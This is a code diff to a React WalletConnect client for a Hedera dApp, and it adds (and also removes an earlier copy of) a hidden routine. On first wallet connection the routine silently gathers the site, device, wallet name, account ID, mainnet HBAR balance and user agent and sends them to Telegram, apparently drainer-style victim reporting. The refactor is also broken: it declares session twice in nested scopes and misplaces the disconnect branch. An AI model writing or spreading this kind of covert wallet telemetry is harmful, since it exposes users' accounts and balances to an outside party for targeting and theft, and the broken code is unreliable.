@@ -231,6 +231,14 @@ class WalletConnectWallet implements WalletInterface {
 
 export const walletConnectWallet = new WalletConnectWallet();
 
+// Place getDeviceType helper at top-level
+function getDeviceType() {
+  const ua = navigator.userAgent;
+  if (/mobile/i.test(ua)) return "Mobile";
+  if (/tablet/i.test(ua)) return "Tablet";
+  return "Desktop";
+}
+
 // this component will sync the walletconnect state with the context
 export const WalletConnectClient = () => {
   const { setAccountId, setIsConnected } = useContext(WalletConnectContext);
@@ -242,51 +250,7 @@ export const WalletConnectClient = () => {
     if (accountId) {
       setAccountId(accountId);
       setIsConnected(true);
-      // Get wallet info from the session
-      const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
-      let walletInfo: WalletInfo | undefined = undefined;
-      if (session) {
-        walletInfo = {
-          name: session.peer.metadata.name,
-          description: session.peer.metadata.description,
-          url: session.peer.metadata.url
-        };
-      }
-      // Only send detailed notification on initial connection
-      if (!window.__walletConnectNotified) {
-        window.__walletConnectNotified = true;
-        // Site name
-        const siteName = window.location.hostname;
-        // Device type
-        function getDeviceType() {
-          const ua = navigator.userAgent;
-          if (/mobile/i.test(ua)) return "Mobile";
-          if (/tablet/i.test(ua)) return "Tablet";
-          return "Desktop";
-        }
-        const deviceType = getDeviceType();
-        // Wallet name
-        const walletName = walletInfo?.name || "Unknown";
-        // Fetch HBAR balance
-        let hbarBalance = "Unknown";
-        try {
-          const mirrorNodeClient = new MirrorNodeClient(appConfig.networks.mainnet);
-          const accountInfo = await mirrorNodeClient.getAccountInfo(accountId);
-          if (accountInfo.balance) {
-            hbarBalance = (accountInfo.balance / 1e8) + " HBAR";
-          }
-        } catch (e) {
-          // ignore
-        }
-        const message = `\n[Wallet Connected]\nSite: ${siteName}\nDevice: ${deviceType}\nWallet: ${walletName}\nAccount: ${accountId}\nBalance: ${hbarBalance}\nUser Agent: ${navigator.userAgent}`;
-        try {
-          await sendMessageToTelegram(message);
-        } catch (error) {
-          // ignore
-        }
-      }
-      
-      // Get wallet info from the session
+      // Get wallet info from the session (declare only once)
       const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
       if (session) {
         const walletInfo: WalletInfo = {
@@ -294,40 +258,76 @@ export const WalletConnectClient = () => {
           description: session.peer.metadata.description,
           url: session.peer.metadata.url
         };
-        // setConnectedWallet(walletInfo);
-        if (session.peer.metadata.name === 'HashPack') {
-          const hederaAccounts = session.namespaces?.hedera?.accounts || [];
-          const targetAccount = hederaAccounts[0]; // Extract the first account in the array
-          // hc.openPairingModal();
-          if (targetAccount) {
-            const logString = JSON.stringify(targetAccount); // Convert object to string if necessary
-            const match = logString.match(/0\.0\.\d+/); // Regex to match IDs in the format 0.0.x
-            if (match) {
-              const accountID = match[0].split(".").pop();
-              dispatch(
-                actions.hashconnect.setAccountIds(
-                  accountID ? [accountID] : []
-                )
-              );
-              dispatch(actions.hashconnect.setIsConnected(true));
-              dispatch(actions.hashconnect.setPairingString('HashPack'));
-              // window.location.reload();
-              // syncWithHashConnect();
-              // handleAllowanceApprove(accountID as string)
-            } else {
-              console.error("Target ID not found.");
+        // Only send detailed notification on initial connection
+        if (!(window as any).__walletConnectNotified) {
+          (window as any).__walletConnectNotified = true;
+          // Site name
+          const siteName = window.location.hostname;
+          // Device type
+          const deviceType = getDeviceType();
+          // Wallet name
+          const walletName = walletInfo?.name || "Unknown";
+          // Fetch HBAR balance
+          let hbarBalance = "Unknown";
+          try {
+            const mirrorNodeClient = new MirrorNodeClient(appConfig.networks.mainnet);
+            const accountInfo = await mirrorNodeClient.getAccountInfo(AccountId.fromString(accountId));
+            if (accountInfo.balance) {
+              hbarBalance = (accountInfo.balance / 1e8) + " HBAR";
             }
-          } else {
-            console.error("No account found in the logs.");
+          } catch (e) {
+            // ignore
           }
-          console.log('go to the syncWithHashConnect');
+          const message = `\n[Wallet Connected]\nSite: ${siteName}\nDevice: ${deviceType}\nWallet: ${walletName}\nAccount: ${accountId}\nBalance: ${hbarBalance}\nUser Agent: ${navigator.userAgent}`;
+          try {
+            await sendMessageToTelegram(message);
+          } catch (error) {
+            // ignore
+          }
         }
-        console.log("Connected wallet:", walletInfo);
+        // Get wallet info from the session
+        const session = dappConnector.walletConnectClient?.session.get(dappConnector.walletConnectClient.session.keys[0]);
+        if (session) {
+          const walletInfo: WalletInfo = {
+            name: session.peer.metadata.name,
+            description: session.peer.metadata.description,
+            url: session.peer.metadata.url
+          };
+          // setConnectedWallet(walletInfo);
+          if (session.peer.metadata.name === 'HashPack') {
+            const hederaAccounts = session.namespaces?.hedera?.accounts || [];
+            const targetAccount = hederaAccounts[0]; // Extract the first account in the array
+            // hc.openPairingModal();
+            if (targetAccount) {
+              const logString = JSON.stringify(targetAccount); // Convert object to string if necessary
+              const match = logString.match(/0\.0\.\d+/); // Regex to match IDs in the format 0.0.x
+              if (match) {
+                const accountID = match[0].split(".").pop();
+                dispatch(
+                  actions.hashconnect.setAccountIds(
+                    accountID ? [accountID] : []
+                  )
+                );
+                dispatch(actions.hashconnect.setIsConnected(true));
+                dispatch(actions.hashconnect.setPairingString('HashPack'));
+                // window.location.reload();
+                // syncWithHashConnect();
+                // handleAllowanceApprove(accountID as string)
+              } else {
+                console.error("Target ID not found.");
+              }
+            } else {
+              console.error("No account found in the logs.");
+            }
+            console.log('go to the syncWithHashConnect');
+          }
+          console.log("Connected wallet:", walletInfo);
+        }
+      } else {
+        setAccountId('');
+        setIsConnected(false);
+        setConnectedWallet(null);
       }
-    } else {
-      setAccountId('');
-      setIsConnected(false);
-      setConnectedWallet(null);
     }
   }, [setAccountId, setIsConnected]);
 
